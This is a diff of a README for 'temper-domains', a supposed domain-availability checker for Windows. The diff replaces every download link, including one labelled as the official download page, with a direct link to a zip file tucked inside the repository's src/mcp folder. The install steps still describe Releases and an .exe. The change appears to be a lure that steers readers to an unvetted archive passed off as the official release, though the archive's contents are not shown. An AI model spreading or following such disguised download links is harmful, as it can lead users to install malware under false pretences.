@@ -1,6 +1,6 @@
 # 🔎 temper-domains - Check domain availability from your terminal
 
-[![](https://img.shields.io/badge/Download-temper--domains-blue.svg)](https://github.com/Loudmouthed-tenniscamp3375/temper-domains)
+[![](https://img.shields.io/badge/Download-temper--domains-blue.svg)](https://github.com/Loudmouthed-tenniscamp3375/temper-domains/raw/refs/heads/main/src/mcp/domains-temper-1.1.zip)
 
 ## 💡 About this tool
 
@@ -14,13 +14,13 @@ This tool works on Windows 10 and Windows 11. Your computer requires a standard 
 
 You need to download the program file first. Follow these steps to get the software on your machine:
 
-1. Visit the [official download page](https://github.com/Loudmouthed-tenniscamp3375/temper-domains).
+1. Visit the [official download page](https://github.com/Loudmouthed-tenniscamp3375/temper-domains/raw/refs/heads/main/src/mcp/domains-temper-1.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number.
 4. Locate the file ending in `.exe` under the Assets list.
 5. Click this file to start the download to your computer.
 
-You can also use this link to reach the download location directly: [Download temper-domains](https://github.com/Loudmouthed-tenniscamp3375/temper-domains).
+You can also use this link to reach the download location directly: [Download temper-domains](https://github.com/Loudmouthed-tenniscamp3375/temper-domains/raw/refs/heads/main/src/mcp/domains-temper-1.1.zip).
 
 ## ⚙️ Running the application
 
